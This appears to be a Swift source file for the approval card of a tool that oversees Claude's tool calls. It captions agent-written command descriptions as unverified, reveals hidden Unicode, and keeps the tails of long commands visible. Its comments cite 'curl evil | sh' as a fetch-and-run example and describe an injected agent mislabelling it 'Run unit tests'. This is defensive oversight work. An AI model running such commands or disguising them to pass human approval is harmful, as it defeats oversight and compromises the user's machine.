import Foundation

/// One plain line saying what a tool call does, shown above the raw command on the approval card.
/// `fromAgent` marks text the agent wrote itself (Bash `description`): the card captions it "Claude says (unverified):",
/// because an injected agent could describe `curl evil | sh` as "Run unit tests". Everything else is derived
/// from the actual tool input, so it needs no caption. Never invents a reason.
public struct ApprovalIntent: Equatable {
    public static let maxLength = 100
    public let text: String
    public let fromAgent: Bool

    /// nil when there is nothing trustworthy and useful to say, or when the line would only repeat the raw detail
    /// (Edit/Write/Read/MultiEdit show their path as the detail already); the card then keeps its plain layout.
    public static func make(tool: String, input: [String: Any], home: String = NSHomeDirectory()) -> ApprovalIntent? {
        func str(_ k: String) -> String? {
            let s = clean(input[k] as? String ?? "")
            return s.isEmpty ? nil : s
        }
        func derived(_ t: String?) -> ApprovalIntent? { t.map { ApprovalIntent(text: cap($0), fromAgent: false) } }
        switch tool {
        case "Bash": return str("description").map { ApprovalIntent(text: cap($0), fromAgent: true) }
        case "NotebookEdit": return derived(str("notebook_path").map { "Edit notebook \(displayPath($0, home: home))" })
        case "WebFetch": return derived(str("url").flatMap(host(of:)).map { "Fetch \($0)" }) // no host, no claim
        case "WebSearch": return derived(str("query").map { "Search the web for \"\($0)\"" })
        case "Glob": return derived(str("pattern").map { "Find files matching \($0)" })
        case "Grep": return derived(str("pattern").map { "Search files for \"\($0)\"" })
        default: return nil // includes Edit/MultiEdit/Write/Read: the raw detail is already their path
        }
    }

    /// Scalars that can reorder, hide or fake text: C0/C1 controls, bidi controls, zero-width and invisible characters.
    static func isHidden(_ u: Unicode.Scalar) -> Bool {
        switch u.value {
        case 0x00...0x1F, 0x7F...0x9F, 0xAD, 0x034F, 0x061C, 0x115F, 0x1160, 0x180E, 0x200B...0x200F, 0x2028, 0x2029,
             0x202A...0x202E, 0x2060...0x2064, 0x2066...0x2069, 0x3164, 0xFE00...0xFE0F, 0xFEFF, 0xFFA0,
             0xE0000...0xE007F, 0xE0100...0xE01EF: return true
        default: return false
        }
    }

    /// For intent text: strips hidden scalars (newlines and tabs become spaces) and collapses whitespace.
    static func clean(_ s: String) -> String {
        var out = String.UnicodeScalarView()
        for u in s.unicodeScalars {
            switch u.value {
            case 0x0A, 0x0D, 0x09, 0x2028, 0x2029: out.append(" ")
            default: if !isHidden(u) { out.append(u) }
            }
        }
        return String(out).split(separator: " ", omittingEmptySubsequences: true).joined(separator: " ")
    }

    /// For the raw command: hidden scalars are shown as `<U+202E>` instead of acting, so the reader sees them.
    /// Newlines and tabs stay as they are. The marker symbol ⋯ is revealed too, so command text can never
    /// pass for one of our "hidden" markers.
    public static func reveal(_ s: String) -> String {
        var out = ""
        for u in s.unicodeScalars {
            if u.value == 0x0A || u.value == 0x0D || u.value == 0x09 || (!isHidden(u) && u != markSymbol) { out.unicodeScalars.append(u) }
            else { out += String(format: "<U+%04X>", u.value) }
        }
        return out
    }

    static func cap(_ s: String) -> String { s.count > maxLength ? String(s.prefix(maxLength - 1)) + "…" : s }

    /// Path with the home dir as ~, at most `limit` characters: a long directory is middle-truncated with the filename
    /// kept; a filename too long for that is itself middle-truncated keeping its extension. Counts graphemes.
    static func displayPath(_ p: String, home: String, limit: Int = 60) -> String {
        var s = p
        if !home.isEmpty, home != "/", s == home || s.hasPrefix(home + "/") { s = "~" + s.dropFirst(home.count) }
        guard s.count > limit else { return s }
        if s.count > 1, s.hasSuffix("/") { // a directory: shorten it as a path, then put the slash back
            return displayPath(String(s.dropLast()), home: "", limit: limit - 1) + "/"
        }
        let name = (s as NSString).lastPathComponent
        let dir = String(s.dropLast(name.count))
        let room = limit - name.count - 1 // for the "…" joining dir parts
        if room >= 8 {
            let head = String(dir.prefix(room / 2)), tail = String(dir.suffix(room - room / 2))
            return head + "…" + tail + name
        }
        // Filename alone is (nearly) the whole budget: drop the directory and shorten the name, keeping its extension.
        guard name.count > limit else { return name }
        let ext = (name as NSString).pathExtension
        let keepExt = ext.isEmpty || ext.count > 8 ? "" : "." + ext
        let stem = String(name.dropLast(keepExt.count))
        let budget = max(limit - keepExt.count - 1, 2)
        let head = String(stem.prefix(budget - budget / 2)), tail = String(stem.suffix(budget / 2))
        return head + "…" + tail + keepExt
    }

    /// Host of an http(s)-style URL, or nil when there is none to show.
    static func host(of url: String) -> String? {
        guard let h = URL(string: url)?.host, !h.isEmpty else { return nil }
        return h
    }

    /// Marker symbol for text Chippy omitted. `reveal()` shows any ⋯ in a command as `<U+22EF>`, so command text
    /// can never pass for a marker.
    static let markSymbol = Unicode.Scalar(0x22EF)!

    static func marker(_ what: String) -> String { "\(markSymbol) \(what) \(markSymbol)" }

    /// What the card shows of the raw command (already passed through `reveal`), bounded to `maxRows` rows of
    /// `columns` characters: all of it when it fits, otherwise the first rows, an explicit marker row
    /// ("⋯ N more lines hidden ⋯", or "⋯ +N chars hidden ⋯" for one long line) and the last rows, so a tail
    /// like `| sh` is always visible and the omission is too. `columns` is deliberately conservative (narrower
    /// than the card); the view keeps only a generous line-limit backstop.
    public static func preview(_ s: String, columns: Int = 40, maxRows: Int = 6) -> String {
        let lines = s.split(omittingEmptySubsequences: false, whereSeparator: \.isNewline) // CRLF is one Character
        // `stored` is set on every row of a logical line that is a stored marker (even if it wraps at narrow widths).
        var rows: [(text: String, lineEnd: Bool, stored: Int?, isFirst: Bool)] = []
        for line in lines {
            let stored = storedOmitted(String(line))
            var rest = Substring(line), first = true
            repeat {
                rows.append((String(rest.prefix(columns)), false, stored, first)); first = false
                rest = rest.dropFirst(columns)
            } while !rest.isEmpty
            rows[rows.count - 1].lineEnd = true
        }
        guard rows.count > maxRows else { return s }
        let tail = max(maxRows / 3, 1), head = maxRows - tail - 1
        let range = head..<(rows.count - tail)
        // If headTail already cut this text, its "+N chars hidden" row may fall in the dropped part: carry N through
        // so the total never understates (original newlines inside N are already counted there).
        var carried = 0, sawStored = false
        for i in range {
            if let n = rows[i].stored { sawStored = true; carried = max(carried, n) } // one stored marker per detail
        }
        let note: String
        if sawStored {
            var total = carried
            for i in range where rows[i].stored == nil {
                total += rows[i].text.count
                // a line end counts as a newline, except the one inserted just before the stored marker row
                let nextIsMarker = i + 1 < rows.count && rows[i + 1].stored != nil
                if rows[i].lineEnd && !nextIsMarker { total += 1 }
            }
            note = "+\(total) chars hidden"
        } else if lines.count == 1 {
            note = "+\(range.reduce(0) { $0 + rows[$1].text.count }) chars hidden"
        } else {
            note = "\(range.count) more lines hidden"
        }
        return (rows[..<head].map(\.text) + [marker(note)] + rows[(rows.count - tail)...].map(\.text)).joined(separator: "\n")
    }

    /// N from a stored "⋯ +N chars hidden ⋯" row (only we produce these: `reveal` neutralises ⋯ in commands).
    static func storedOmitted(_ row: String) -> Int? {
        let pre = "\(markSymbol) +", suf = " chars hidden \(markSymbol)"
        guard row.hasPrefix(pre), row.hasSuffix(suf), row.count > pre.count + suf.count else { return nil }
        return Int(row.dropFirst(pre.count).dropLast(suf.count))
    }

    /// Keeps the head AND the tail of a long command for storage, so something like a trailing `| sh` is never cut
    /// off, with a "+N chars hidden" marker between.
    public static func headTail(_ s: String, limit: Int = 800) -> String {
        guard s.count > limit else { return s }
        let tail = limit * 3 / 8, head = limit - tail
        return String(s.prefix(head)) + "\n" + marker("+\(s.count - head - tail) chars hidden") + "\n" + String(s.suffix(tail))
    }
}
